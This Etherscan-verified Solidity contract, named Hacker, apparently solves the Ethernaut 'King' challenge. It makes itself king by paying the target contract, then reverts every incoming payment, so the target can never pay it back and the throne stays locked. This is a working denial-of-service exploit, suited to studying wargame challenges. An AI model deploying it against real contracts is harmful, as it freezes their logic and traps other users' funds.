/**
 *Submitted for verification at Etherscan.io on 2022-12-22
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IKing {
    function prize() external view returns (uint256);

    function owner() external view returns (address);

    function _king() external view returns (address);
}

contract Hacker {
    IKing public kingContract;
    address public owner;
    bool public killSwitch;

    modifier onlyOwner() {
        require(msg.sender == owner, "NOPE, amigo");
        _;
    }

    constructor(IKing _kingContract) {
        kingContract = _kingContract;
        owner = msg.sender;
        killSwitch = true;
    }

    function killMe() external onlyOwner {
        selfdestruct(payable(owner));
    }

    function getPrize() public view returns (uint256) {
        return kingContract.prize();
    }

    function outbidPrize(uint256 _amount) external view returns (uint256) {
        return getPrize() + _amount;
    }

    function changeKillSwitch(bool _killSwitch) external onlyOwner {
        killSwitch = _killSwitch;
    }

    function sendPayment() external payable {
        address(kingContract).call{value: msg.value}("");
    }

    receive() external payable {
        if (killSwitch) {
            revert("No way!");
        }
    }
}